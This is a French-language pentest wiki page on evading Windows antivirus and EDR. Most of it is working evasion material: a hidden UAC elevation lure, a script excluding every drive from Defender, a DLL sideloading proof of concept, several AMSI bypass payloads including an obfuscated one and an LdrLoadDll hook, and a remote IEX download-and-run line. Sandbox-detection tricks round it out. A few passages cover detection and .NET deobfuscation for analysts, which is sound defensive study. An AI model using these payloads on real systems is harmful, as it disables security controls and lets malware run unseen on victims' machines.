# Contournement de l’antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a été initialement rédigée par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour empêcher Windows Defender de fonctionner en simulant un autre antivirus.
- [Désactiver Defender si vous êtes admin](basic-powershell-for-pentesters/README.md)

### Leurre UAC de type installateur avant de modifier Defender

Les loaders publics se faisant passer pour des cheats de jeux sont souvent distribués sous forme d’installateurs Node.js/Nexe non signés, qui **demandent d’abord à l’utilisateur une élévation de privilèges** avant de neutraliser Defender. Le processus est simple :

1. Vérifier si le contexte est administratif avec `net session`. La commande ne réussit que lorsque l’appelant dispose de droits admin ; un échec indique donc que le loader s’exécute en tant qu’utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` pour déclencher l’invite de consentement UAC attendue tout en conservant la ligne de commande d’origine.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Les victimes pensent déjà installer un logiciel « cracké », elles acceptent donc généralement l’invite, ce qui donne au malware les droits nécessaires pour modifier la stratégie de Defender.<sup>[[26]](#references)</sup>

### Exclusions globales de `MpPreference` pour chaque lettre de lecteur

Une fois les privilèges élevés obtenus, les chaînes de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver complètement le service. Le loader commence par tuer le processus de surveillance de l’interface graphique (`taskkill /F /IM SecHealthUI.exe`), puis ajoute des **exclusions extrêmement larges** afin que chaque profil utilisateur, répertoire système et disque amovible échappe à l’analyse :

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observations clés :

- La boucle parcourt tous les systèmes de fichiers montés (D:\, E:\, clés USB, etc.) : **toute charge utile déposée ultérieurement n’importe où sur le disque est donc ignorée**.
- L’exclusion de l’extension `.sys` est préventive : les attaquants se réservent la possibilité de charger des pilotes non signés plus tard sans avoir à modifier à nouveau Defender.
- Toutes les modifications sont appliquées sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes ultérieures de confirmer que les exclusions persistent ou de les étendre sans déclencher à nouveau l’UAC.

Comme aucun service Defender n’est arrêté, les contrôles de santé naïfs continuent d’indiquer que « l’antivirus est actif », même si l’inspection en temps réel n’examine jamais ces chemins.<sup>[[26]](#references)</sup>

## **Méthodologie d’évasion AV**

Actuellement, les AV utilisent différentes méthodes pour déterminer si un fichier est malveillant : la détection statique, l’analyse dynamique et, pour les EDR plus avancés, l’analyse comportementale.

### **Détection statique**

La détection statique consiste à repérer des chaînes ou des séquences d’octets malveillantes connues dans un binaire ou un script, ainsi qu’à extraire des informations du fichier lui-même (par ex. la description du fichier, le nom de l’entreprise, les signatures numériques, l’icône, la somme de contrôle, etc.). Cela signifie que l’utilisation d’outils publics connus peut vous faire repérer plus facilement, car ils ont probablement été analysés et signalés comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Chiffrement**

Si vous chiffrez le binaire, l’AV ne pourra pas détecter votre programme, mais vous aurez besoin d’un loader pour le déchiffrer et l’exécuter en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier quelques chaînes dans votre binaire ou script pour qu’il échappe à l’AV, mais cela peut prendre du temps selon ce que vous cherchez à obfusquer.

- **Outils personnalisés**

Si vous développez vos propres outils, aucune signature malveillante connue ne leur sera associée, mais cela demande beaucoup de temps et d’efforts.

> [!TIP]
> Pour vérifier la détection statique de Windows Defender, [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) est un bon outil. Il divise le fichier en plusieurs segments, puis demande à Defender d’analyser chacun d’eux individuellement. Il peut ainsi vous indiquer précisément les chaînes ou les octets de votre binaire qui sont signalés.

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l’AV Evasion pratique.

### **Analyse dynamique**

L’analyse dynamique consiste à exécuter votre binaire dans un sandbox et à surveiller toute activité malveillante (par ex. tenter de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump de LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques moyens d’échapper aux sandboxes.

- **Attendre avant l’exécution** Selon la façon dont elle est implémentée, cette méthode peut être très efficace pour contourner l’analyse dynamique des AV. Les AV disposent de très peu de temps pour analyser les fichiers sans perturber le flux de travail de l’utilisateur ; de longues pauses peuvent donc gêner l’analyse des binaires. Le problème est que de nombreux sandbox d’AV peuvent simplement ignorer la pause, selon la façon dont elle est implémentée.
- **Vérifier les ressources de la machine** Les sandbox disposent généralement de très peu de ressources (par ex. < 2GB de RAM), afin de ne pas ralentir la machine de l’utilisateur. Vous pouvez aussi faire preuve de créativité, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs : tout ne sera pas implémenté dans le sandbox.
- **Vérifications propres à la machine** Si vous voulez cibler un utilisateur dont le poste de travail est joint au domaine « contoso.local », vous pouvez vérifier le domaine de l’ordinateur pour voir s’il correspond à celui que vous avez spécifié. Si ce n’est pas le cas, vous pouvez faire quitter votre programme.

Il s’avère que le nom d’ordinateur du sandbox de Microsoft Defender est HAL9TH. Vous pouvez donc vérifier le nom de l’ordinateur dans votre malware avant son déclenchement : s’il correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de Defender et vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Voici d’autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contourner les sandbox.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Comme nous l’avons déjà dit dans cet article, les **outils publics** finiront par **être détectés**. Posez-vous donc la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d’utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui dumpe également LSASS ?

La deuxième option est probablement la bonne. Prenons mimikatz comme exemple : c’est probablement l’un des malwares les plus signalés par les AV et les EDR, voire le plus signalé. Bien que le projet lui-même soit très intéressant, il est aussi cauchemardesque à adapter pour contourner les AV. Cherchez donc simplement des alternatives adaptées à votre objectif.

> [!TIP]
> Lorsque vous modifiez vos charges utiles pour l’évasion, veillez à **désactiver l’envoi automatique d’échantillons** dans Defender et, sérieusement, **NE LES TÉLÉVERSEZ PAS SUR VIRUSTOTAL** si votre objectif est de maintenir l’évasion à long terme. Pour vérifier si votre charge utile est détectée par un AV donné, installez-le sur une VM, essayez de désactiver l’envoi automatique d’échantillons et faites-y des tests jusqu’à obtenir le résultat souhaité.

## EXEs vs DLLs

Dans la mesure du possible, **privilégiez toujours les DLL pour l’évasion**. D’après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés. C’est donc une astuce très simple pour éviter la détection dans certains cas (si votre charge utile peut être exécutée comme une DLL, bien sûr).

Comme le montre cette image, une charge utile DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que la charge utile EXE a un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparaison sur antiscan.me d’une charge utile EXE Havoc standard et d’une DLL Havoc standard</p></figcaption></figure>

Nous allons maintenant présenter quelques astuces pour rendre les fichiers DLL beaucoup plus furtifs.

## DLL Sideloading & Proxying

Le **DLL Sideloading** exploite l’ordre de recherche des DLL utilisé par le loader en plaçant l’application victime et la ou les charges utiles malveillantes côte à côte.

Vous pouvez rechercher les programmes vulnérables au DLL Sideloading à l’aide de [Siofra](https://github.com/Cybereason/siofra) et du script PowerShell suivant :

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Cette commande affichera la liste des programmes vulnérables au DLL hijacking dans « C:\Program Files\\ » et des fichiers DLL qu’ils tentent de charger.

Je vous recommande vivement d’**explorer vous-même les programmes vulnérables au DLL Hijacking/Sideloading**. Cette technique est assez discrète lorsqu’elle est bien exécutée, mais vous risquez de vous faire repérer facilement si vous utilisez des programmes DLL Sideloadable connus publiquement.

Il ne suffit pas de placer une DLL malveillante portant le nom d’une DLL qu’un programme s’attend à charger pour que votre payload soit chargé : le programme s’attend à trouver des fonctions spécifiques dans cette DLL. Pour résoudre ce problème, nous allons utiliser une autre technique appelée **DLL Proxying/Forwarding**.

Le **DLL Proxying** redirige vers la DLL d’origine les appels effectués par un programme via la DLL proxy (et malveillante). Cela préserve les fonctionnalités du programme tout en permettant l’exécution de votre payload.

J’utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/).

Voici les étapes que j’ai suivies :

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

La dernière commande nous donnera 2 fichiers : un modèle de code source de DLL et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et la DLL proxy affichent tous deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! Je dirais que c’est une réussite.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous **recommande vivement** de regarder [le VOD Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading, ainsi que [la vidéo d’ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), pour approfondir les sujets abordés.

### Abus des exports forwardés (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des « forwarders » : au lieu de pointer vers du code, l’entrée d’export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu’un appelant résout l’export, le chargeur Windows va :

- Charger `TargetDll` s’il n’est pas déjà chargé
- Résoudre `TargetFunc` depuis ce module

Comportements clés à comprendre :
- Si `TargetDll` est une KnownDLL, elle est fournie depuis l’espace de noms protégé KnownDLLs (par exemple, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` n’est pas une KnownDLL, l’ordre de recherche normal des DLL est utilisé, ce qui inclut le répertoire du module qui effectue la résolution du forward.

Cela permet une primitive indirecte de sideloading : trouver une DLL signée qui exporte une fonction forwardée vers un nom de module qui n’est pas une KnownDLL, puis placer cette DLL signée dans le même répertoire qu’une DLL contrôlée par l’attaquant et portant exactement le nom du module cible forwardé. Lorsque l’export forwardé est invoqué, le chargeur résout le forward et charge votre DLL depuis le même répertoire, exécutant ainsi votre DllMain.<sup>[[13]](#references)</sup>

Exemple observé sous Windows 11 :

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` n’est pas une KnownDLL ; elle est donc résolue selon l’ordre de recherche normal.

PoC (copier-coller) :
1) Copiez la DLL système signée dans un dossier accessible en écriture.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez une `NCRYPTPROV.dll` malveillante dans le même dossier. Un `DllMain` minimal suffit pour exécuter du code ; vous n’avez pas besoin d’implémenter la fonction transférée pour déclencher `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Déclenchez le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportement observé :
- rundll32 (signé) charge le `keyiso.dll` side-by-side (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n’est pas implémenté, vous obtiendrez une erreur « missing API » seulement après l’exécution de `DllMain`

Conseils de recherche :
- Concentrez-vous sur les exports forwardés dont le module cible n’est pas un KnownDLL. Les KnownDLLs sont listés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l’inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idées de détection/défense :
- Surveillez les LOLBins (par ex., rundll32.exe) qui chargent des DLL signées depuis des chemins non système, puis chargent des DLL non-KnownDLLs portant le même nom de base depuis ce répertoire
- Déclenchez une alerte en cas de chaînes de processus/modules comme : `rundll32.exe` → `keyiso.dll` non système → `NCRYPTPROV.dll` dans des chemins accessibles en écriture par l’utilisateur
- Appliquez des politiques d’intégrité du code (WDAC/AppLocker) et interdisez les droits d’écriture et d’exécution dans les répertoires d’application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est une boîte à outils de payload permettant de contourner les EDR à l’aide de processus suspendus, d’appels système directs et de méthodes d’exécution alternatives`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L’evasion est un jeu du chat et de la souris : ce qui fonctionne aujourd’hui pourrait être détecté demain. Ne vous fiez donc jamais à un seul outil ; si possible, essayez d’enchaîner plusieurs techniques d’evasion.

## Syscalls directs/indirects et résolution des SSN (SysWhispers4)

Les EDR placent souvent des **hooks inline en mode utilisateur** sur les stubs syscall de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et passent en mode noyau sans exécuter le point d’entrée exporté intercepté.<sup>[[32]](#references)</sup>

**Options d’invocation :**
- **Direct (intégré)** : émettre une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (aucun accès à un export de `ntdll`).
- **Indirect** : sauter vers un gadget `syscall` existant dans `ntdll` afin que la transition vers le noyau semble provenir de `ntdll` (utile pour l’evasion heuristique) ; **randomized indirect** sélectionne un gadget dans un pool à chaque appel.
- **Egg-hunt** : éviter d’intégrer sur disque la séquence d’opcodes statique `0F 05` ; résoudre une séquence syscall à l’exécution.

**Stratégies de résolution des SSN résistantes aux hooks :**
- **FreshyCalls (tri VA)** : déduire les SSN en triant les stubs syscall par adresse virtuelle au lieu de lire les octets des stubs.
- **SyscallsFromDisk** : mapper un `\KnownDlls\ntdll.dll` propre, lire les SSN depuis son `.text`, puis le démapper (contourne tous les hooks en mémoire).
- **RecycledGate** : combiner la déduction des SSN par tri des VA avec la validation des opcodes lorsque le stub est propre ; revenir à la déduction par VA s’il est intercepté.
- **HW Breakpoint** : définir DR0 sur l’instruction `syscall` et utiliser un VEH pour capturer le SSN depuis `EAX` à l’exécution, sans analyser les octets interceptés.

Exemple d’utilisation de SysWhispers4 :
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Interface d’analyse anti-malware)

AMSI a été créé pour empêcher les « [malwares sans fichier](https://en.wikipedia.org/wiki/Fileless_malware) ». Au départ, les antivirus ne pouvaient analyser que les **fichiers sur le disque**. Ainsi, si vous pouviez exécuter des payloads **directement en mémoire**, l’antivirus ne pouvait rien faire pour l’empêcher, car il ne disposait pas d’une visibilité suffisante.

La fonctionnalité AMSI est intégrée aux composants Windows suivants :

- Contrôle de compte d’utilisateur, ou UAC (élévation de privilèges pour les fichiers EXE, COM, MSI ou l’installation d’ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation dynamique de code)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros VBA d’Office

Elle permet aux solutions antivirus d’inspecter le comportement des scripts en exposant leur contenu sous une forme à la fois déchiffrée et désobfusquée.

L’exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` déclenchera l’alerte suivante dans Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez qu’il ajoute `amsi:` suivi du chemin vers l’exécutable qui a lancé le script, dans ce cas, powershell.exe.

Nous n’avons déposé aucun fichier sur le disque, mais nous avons tout de même été détectés en mémoire grâce à AMSI.

Par ailleurs, depuis **.NET 4.8**, le code C# est également analysé par AMSI. Cela concerne même `Assembly.Load(byte[])`, utilisé pour charger du code à exécuter en mémoire. C’est pourquoi il est recommandé d’utiliser des versions antérieures de .NET (comme la 4.7.2 ou une version précédente) pour l’exécution en mémoire si vous souhaitez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

AMSI reposant principalement sur des détections statiques, modifier les scripts que vous essayez de charger peut donc être un bon moyen d’échapper à la détection.

Cependant, AMSI peut désobfusquer les scripts, même s’ils comportent plusieurs couches d’obfuscation. L’obfuscation peut donc être une mauvaise option selon la manière dont elle est réalisée. Il n’est donc pas si simple d’échapper à la détection. Parfois, il suffit toutefois de modifier quelques noms de variables, selon le niveau de détection dont fait l’objet un élément.

- **AMSI Bypass**

AMSI étant implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est facile de la manipuler, même avec un compte utilisateur non privilégié. En raison de cette faille dans l’implémentation d’AMSI, des chercheurs ont trouvé plusieurs façons d’échapper à son analyse.

**Provoquer une erreur**

Forcer l’échec de l’initialisation d’AMSI (amsiInitFailed) empêchera toute analyse dans le processus en cours. Cette méthode a été divulguée à l’origine par [Matt Graeber](https://twitter.com/mattifestation), et Microsoft a développé une signature pour empêcher sa généralisation.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Une seule ligne de code PowerShell a suffi pour rendre AMSI inutilisable dans le processus PowerShell en cours. Cette ligne a bien sûr été détectée par AMSI lui-même ; il faut donc la modifier pour utiliser cette technique.

Voici un contournement d’AMSI modifié que j’ai repris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Gardez à l’esprit que cette publication sera probablement signalée dès sa parution ; vous ne devriez donc publier aucun code si votre objectif est de rester indétecté.

**Memory Patching**

Cette technique, découverte à l’origine par [@RastaMouse](https://twitter.com/_RastaMouse/), consiste à trouver l’adresse de la fonction « AmsiScanBuffer » dans amsi.dll (chargée d’analyser les entrées fournies par l’utilisateur) et à la remplacer par des instructions qui renvoient le code E_INVALIDARG. Ainsi, le résultat de l’analyse proprement dite renvoie 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Veuillez consulter [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

De nombreuses autres techniques permettent également de contourner AMSI avec powershell. Consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce dépôt**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement de amsi.dll (hook LdrLoadDll)

AMSI est initialisé uniquement après le chargement de `amsi.dll` dans le processus actuel. Une méthode de contournement robuste et indépendante du langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll`, qui renvoie une erreur lorsque le module demandé est `amsi.dll`. AMSI ne se charge donc jamais et aucune analyse n’a lieu pour ce processus.<sup>[[23]](#references)</sup>

Schéma d’implémentation (pseudocode C/C++ x64) :
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Fonctionne avec PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait autrement AMSI).
- Associez cette méthode à l’envoi de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les longues traces dans la ligne de commande.
- A été utilisé par des loaders exécutés via des LOLBins (p. ex. `regsvr32` qui appelle `DllRegisterServer`).

L’outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également des scripts pour contourner AMSI.
L’outil **[https://amsibypass.com/](https://amsibypass.com/)** génère également des scripts pour contourner AMSI en évitant les signatures grâce à des fonctions définies par l’utilisateur, des variables et des expressions de caractères randomisées, ainsi qu’à une casse aléatoire des caractères des mots-clés PowerShell.

**Supprimer la signature détectée**

Vous pouvez utiliser des outils tels que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus actuel. Ces outils recherchent la signature AMSI dans la mémoire du processus actuel, puis la remplacent par des instructions NOP, ce qui la supprime effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous trouverez une liste des produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser la version 2 de PowerShell**
Si vous utilisez la version 2 de PowerShell, AMSI ne sera pas chargé : vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Vous pouvez procéder ainsi :

```bash
powershell.exe -version 2
```

## PS Logging

La journalisation PowerShell est une fonctionnalité qui permet de consigner toutes les commandes PowerShell exécutées sur un système. Elle peut être utile à des fins d’audit et de dépannage, mais elle peut aussi **poser problème aux attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver PowerShell Transcription et Module Logging** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Utiliser PowerShell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Pour cela, exécutez : `powershell.exe -version 2`
- **Utiliser une session PowerShell non managée** : utilisez [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour héberger PowerShell sans lancer `powershell.exe` (l’approche utilisée par `powerpick` de Cobalt Strike). Cela permet d’échapper aux contrôles spécifiquement liés au processus `powershell.exe`, mais ne désactive pas intrinsèquement AMSI, Script Block Logging ni toutes les autres protections PowerShell ; la couverture dépend du runtime et de l’implémentation de l’hôte.


## Obfuscation

> [!TIP]
> Plusieurs techniques d’obfuscation reposent sur le chiffrement des données, ce qui augmente l’entropie du binaire et facilite sa détection par les AV et les EDR. Soyez prudent et n’appliquez éventuellement le chiffrement qu’aux sections sensibles de votre code ou à celles qui doivent être dissimulées.

### Déobfuscation de binaires .NET protégés par ConfuserEx

Lors de l’analyse de malware utilisant ConfuserEx 2 (ou ses forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le workflow ci-dessous **rétablit de manière fiable un IL presque identique à l’original**, qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Suppression de la protection anti-altération – ConfuserEx chiffre chaque *corps de méthode* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Il modifie également la somme de contrôle PE, de sorte que toute modification fera planter le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`), qui peuvent être utiles pour créer votre propre unpacker.

2.  Récupération des symboles / du flux de contrôle – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible avec ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Indicateurs :
     • `-p crx` – sélectionne le profil ConfuserEx 2
     • de4dot annule l’aplatissement du flux de contrôle, restaure les espaces de noms, les classes et les noms de variables d’origine, et déchiffre les chaînes constantes.

3.  Suppression des proxy-calls – ConfuserEx remplace les appels de méthode directs par des wrappers légers (aussi appelés *proxy calls*) afin de compliquer davantage la décompilation.  Supprimez-les avec **ProxyCall-Remover** :
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Après cette étape, vous devriez voir des API .NET normales, telles que `Convert.FromBase64String` ou `AES.Create()`, à la place de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire obtenu dans dnSpy et recherchez de grands blocs Base64 ou l’utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le véritable payload. Le malware le stocke souvent sous forme de tableau d’octets encodé en TLV, initialisé dans `<Module>.byte_0`.

La chaîne ci-dessus restaure le flux d’exécution **sans** avoir à exécuter l’échantillon malveillant – ce qui est utile lors d’un travail sur un poste de travail hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute`, qui peut être utilisé comme IOC pour trier automatiquement les échantillons.

#### Commande en une ligne
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator) : l’objectif de ce projet est de fournir un fork open source de la suite de compilation [LLVM](http://www.llvm.org/) capable d’améliorer la sécurité logicielle grâce à l’[obfuscation de code](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et à la protection contre les falsifications.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator) : ADVobfuscator montre comment utiliser le langage `C++11/14` pour générer, à la compilation, du code obfusqué sans outil externe et sans modifier le compilateur.
